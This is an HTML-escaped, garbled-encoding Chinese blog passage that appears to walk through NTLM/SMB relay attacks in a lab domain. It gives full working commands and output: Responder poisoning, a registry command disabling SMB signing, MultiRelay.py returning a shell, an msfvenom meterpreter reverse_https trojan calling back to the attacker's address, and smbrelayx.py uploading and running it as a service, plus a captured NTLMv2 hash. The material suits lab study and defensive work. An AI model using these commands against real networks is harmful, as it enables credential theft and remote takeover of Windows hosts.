&lt;p&gt;Kali-Linuxï¼ˆæ”»å‡»è€…ï¼‰ï¼š172.16.0.107&lt;/p&gt;
&lt;p&gt;Windows Server 2016 ï¼ˆDCï¼‰ï¼š172.16.0.106&lt;/p&gt;
&lt;p&gt;Windows 7 ï¼ˆå—å®³è€…ï¼‰ï¼š172.16.0.105&lt;/p&gt;
&lt;h2 id=&#34;å®æˆ˜æ”»å‡»&#34;&gt;å®æˆ˜æ”»å‡»&lt;/h2&gt;
&lt;p&gt;ä½¿ç”¨çš„å·¥å…·æ˜¯kaliè‡ªå¸¦çš„Responderï¼Œå·¥å…·ç›®å½•åœ¨&lt;code&gt;/usr/share/responder/tools&lt;/code&gt;ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘ä»¬å…ˆç”¨RunFinger.pyæ¥æŸ¥çœ‹ä¸‹å†…ç½‘ä¸­å¼€æ”¾çš„ä¿¡æ¯ï¼Œå¯ä»¥çœ‹åˆ°106åŸŸæ§æ˜¯å¼€å¯äº†smbç­¾åçš„ï¼Œä½†Windows 7 æ²¡æœ‰ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/usr/share/responder/tools&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ sudo python2 RunFinger.py -i 172.16.0.1/24
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;172.16.0.106&amp;#39;&lt;/span&gt;, Os:&lt;span class=&#34;s1&#34;&gt;&amp;#39;Windows 10/Server 2016/2019 (check build)&amp;#39;&lt;/span&gt;, Build:&lt;span class=&#34;s1&#34;&gt;&amp;#39;14393&amp;#39;&lt;/span&gt;, Domain:&lt;span class=&#34;s1&#34;&gt;&amp;#39;HACK&amp;#39;&lt;/span&gt;, Bootime: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Last restart: 2022-02-13 15:06:52&amp;#39;&lt;/span&gt;, Signing:&lt;span class=&#34;s1&#34;&gt;&amp;#39;True&amp;#39;&lt;/span&gt;, RDP:&lt;span class=&#34;s1&#34;&gt;&amp;#39;True&amp;#39;&lt;/span&gt;, SMB1:&lt;span class=&#34;s1&#34;&gt;&amp;#39;Enabled&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;SMB2&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;:&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;172.16.0.105&amp;#39;&lt;/span&gt;, Os:&lt;span class=&#34;s1&#34;&gt;&amp;#39;Windows 7/Server 2008R2&amp;#39;&lt;/span&gt;, Build:&lt;span class=&#34;s1&#34;&gt;&amp;#39;7601&amp;#39;&lt;/span&gt;, Domain:&lt;span class=&#34;s1&#34;&gt;&amp;#39;HACK&amp;#39;&lt;/span&gt;, Bootime: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Last restart: 2022-02-14 18:18:00&amp;#39;&lt;/span&gt;, Signing:&lt;span class=&#34;s1&#34;&gt;&amp;#39;False&amp;#39;&lt;/span&gt;, RDP:&lt;span class=&#34;s1&#34;&gt;&amp;#39;True&amp;#39;&lt;/span&gt;, SMB1:&lt;span class=&#34;s1&#34;&gt;&amp;#39;Enabled&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬ä¸Šé¢åœ¨åŸºç¡€éƒ¨åˆ†è¯´äº†ï¼Œå¦‚æœå¼€å¯äº†smb Signingï¼Œé‚£æˆ‘ä»¬çš„é‡æ”¾æ”»å‡»å°±æ— æ³•åˆ©ç”¨ï¼Œä½†é™¤äº†åŸŸæ§æ˜¯é»˜è®¤å¼€å¯çš„ï¼Œå…¶ä»–çš„æœºå™¨éƒ½æ˜¯é»˜è®¤å…³é—­çš„çŠ¶æ€ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥åˆ©ç”¨ã€‚&lt;/p&gt;
&lt;p&gt;å…³é—­SMBç­¾åéªŒè¯çš„å‘½ä»¤ï¼š Windows Serverç³»åˆ—ä¸­RequireSecuritySignatureå­é”®é»˜è®¤å€¼ä¸º1&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;reg add HKLM\SYSTEM\CurrentControlSet\Services\LanmanServer\Parameters /v RequireSecuritySignature /t REG_DWORD /d 0 /f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;çŸ¥é“å†…ç½‘ä¸­çš„ä¿¡æ¯åï¼Œæˆ‘ä»¬å…ˆç”¨Responderè¿›è¡ŒæŠ•æ¯’,ä½†æ˜¯è¦ä¿®æ”¹ä¸€ä¸‹é…ç½®æ–‡ä»¶ï¼Œå…³é—­smbå’Œhttpï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;sudo vim /usr/share/responder/Responder.conf
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;[Responder Core]
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;; Servers to start
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SQL = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SMB = Off  ;ä¿®æ”¹ä¸ºOff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;RDP = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Kerberos = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FTP = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;POP = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SMTP = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;IMAP = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTP = Off ;ä¿®æ”¹ä¸ºOff
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;HTTPS = On
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;DNS = On
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ä¿å­˜åæˆ‘ä»¬å°±å¯ä»¥å¼€å¯æŠ•æ¯’æ¬ºéª—ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ sudo responder -I eth0      
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åœ¨æ–°å»ºä¸€ä¸ªçª—å£ï¼Œæ‰§è¡ŒMultiRelay.pyæ–‡ä»¶ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/usr/share/responder/tools&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ sudo python3 MultiRelay.py -t 172.16.0.105 -u ALL 
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Responder MultiRelay 2.5 NTLMv1/2 Relay
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Send bugs/hugs/comments to: laurent.gaffie@gmail.com
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Usernames to relay &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;-u&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; are &lt;span class=&#34;k&#34;&gt;case&lt;/span&gt; sensitive.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;To &lt;span class=&#34;nb&#34;&gt;kill&lt;/span&gt; this script hit CTRL-C.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;/*
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Use this script in combination with Responder.py &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; best results.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Make sure to &lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; SMB and HTTP to OFF in Responder.conf.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;This tool listen on TCP port 80, &lt;span class=&#34;m&#34;&gt;3128&lt;/span&gt; and 445.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;For optimal pwnage, launch Responder only with these &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; options:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rv
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Avoid running a &lt;span class=&#34;nb&#34;&gt;command&lt;/span&gt; that will likely prompt &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; information like net use, etc.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;If you &lt;span class=&#34;k&#34;&gt;do&lt;/span&gt; so, use taskkill &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;as system&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; to &lt;span class=&#34;nb&#34;&gt;kill&lt;/span&gt; the process.
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;*/
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Relaying credentials &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; these users:
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ALL&amp;#39;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Retrieving information &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 172.16.0.105...
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;SMB signing: False
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Os version: &lt;span class=&#34;s1&#34;&gt;&amp;#39;Windows 7 Ultimate 7601 Service Pack 1&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Hostname: &lt;span class=&#34;s1&#34;&gt;&amp;#39;WIN7&amp;#39;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Part of the &lt;span class=&#34;s1&#34;&gt;&amp;#39;HACK&amp;#39;&lt;/span&gt; domain
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;æˆ‘ä»¬ç°åœ¨å°±ç­‰å®¢æˆ·ç«¯è¾“å…¥é”™è¯¯çš„uncè§¦å‘smbå°±å¯ä»¥äº†ï¼Œæˆ‘ä»¬åœ¨DCï¼ˆ172.16.0.106ï¼‰ä¸­è¾“å…¥ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-powershell&#34; data-lang=&#34;powershell&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;c:&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;\&amp;gt;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;net&lt;/span&gt; &lt;span class=&#34;n&#34;&gt;use&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;\\&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;x&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç„¶åæˆ‘ä»¬å¯ä»¥çœ‹åˆ°MultiRelayè¿™è¾¹å·²ç»è¿”å›äº†Windows 7 çš„shellï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/NTLM_relay/3.png&#34; alt=&#34;3&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;æ‰©å±•&#34;&gt;æ‰©å±•&lt;/h2&gt;
&lt;p&gt;å…¶å®è¿˜å¯ä»¥ä¸­&lt;strong&gt;smbrelayx.py&lt;/strong&gt;æ¥åšsmbä¸­ç»§æ”»å‡»çš„ï¼Œä¹Ÿæ˜¯åˆ©ç”¨NTLMé‡æ”¾çš„åŸç†ï¼Œè¿™ä¸ªå·¥å…·æ˜¯åœ¨Impacketé‡Œé¢çš„ï¼Œkaliæ˜¯è‡ªå¸¦äº†çš„ï¼Œåœ¨&lt;code&gt;/usr/local/bin/smbrelayx.py&lt;/code&gt;ä¸­ã€‚&lt;/p&gt;
&lt;p&gt;å®éªŒç¯å¢ƒè¿˜æ˜¯ä¸Šé¢çš„ä¸€æ ·ï¼Œæˆ‘ä»¬åœ¨kaliç”Ÿæˆä¸€ä¸ªæœ¨é©¬ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;msfvenom -p windows/x64/meterpreter/reverse_https &lt;span class=&#34;nv&#34;&gt;LHOST&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;172.16.0.107 &lt;span class=&#34;nv&#34;&gt;LPORT&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt; -f exe -o muma.exe 
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;msfå¯åŠ¨ç›‘å¬æ¨¡å¼ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;use exploit/multi/handler
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; payload windows/x64/meterpreter/reverse_https
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lhost 172.16.0.107
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;set&lt;/span&gt; lport &lt;span class=&#34;m&#34;&gt;4444&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;run
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;åˆ°è¿™é‡Œæˆ‘ä»¬å°±å¼€å§‹ç”¨æˆ‘ä»¬çš„smbrelayx.pyæ¥åšä¸­ç»§æ”»å‡»äº†,-hæ˜¯è¦æ”»å‡»çš„ç›®æ ‡ï¼š&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;python3 /usr/local/bin/smbrelayx.py -h 172.16.0.105 -e muma.exe
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;ç°åœ¨å°±ç­‰ç›®æ ‡æ¥è¿æ¥æˆ‘ä»¬çš„kaliæœåŠ¡å™¨ï¼Œéœ€è¦è¾“å…¥è´¦å·å¯†ç ï¼š&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/NTLM_relay/4.png&#34; alt=&#34;4&#34;&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â”Œâ”€â”€&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;kaliã‰¿kali&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;/usr/share/responder/tools&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;â””â”€$ python3 /usr/local/bin/smbrelayx.py -h 172.16.0.105 -e muma.exe                                                                                                     
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Impacket v0.9.25.dev1+20220105.151306.10e53952 - Copyright &lt;span class=&#34;m&#34;&gt;2021&lt;/span&gt; SecureAuth Corporation
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Running in relay mode
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Setting up SMB Server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Setting up HTTP Server
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Servers started, waiting &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; connections
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; SMBD: Received connection from 172.16.0.106, attacking target 172.16.0.105
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Authenticating against 172.16.0.105 as hack&lt;span class=&#34;se&#34;&gt;\t&lt;/span&gt;estuser SUCCEED
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; testuser::hack:f8cf2e8bb2f965de:8da857dc4272eb7d305a62acff5e0cb6:01010000000000003b7562788f21d801bb0408e04420cbdf00000000020008004800410043004b0001000800570049004e003700040010006800610063006b002e006c006100620003001a00770069006e0037002e006800610063006b002e006c0061006200050010006800610063006b002e006c0061006200070008003b7562788f21d8010600040002000000080030003000000000000000010000000020000078d8a44bbfc6b6121c6ec18ceff20831d50d795a119e7c8f4bde82d46ce174e40a001000000000000000000000000000000000000900220063006900660073002f003100370032002e00310036002e0030002e00310030003700000000000000000000000000
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Requesting shares on 172.16.0.105.....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Sending status code STATUS_SUCCESS after authentication to 172.16.0.106
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;-&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; TreeConnectAndX not found C$
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Found writable share ADMIN$
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Uploading file ZEmZGtiv.exe
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Opening SVCManager on 172.16.0.105.....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Creating service jTHX on 172.16.0.105.....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Starting service jTHX.....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Service Installed.. CONNECT!
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Opening SVCManager on 172.16.0.105.....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Stopping service jTHX.....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Removing service jTHX.....
&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;*&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt; Removing file ZEmZGtiv.exe.....
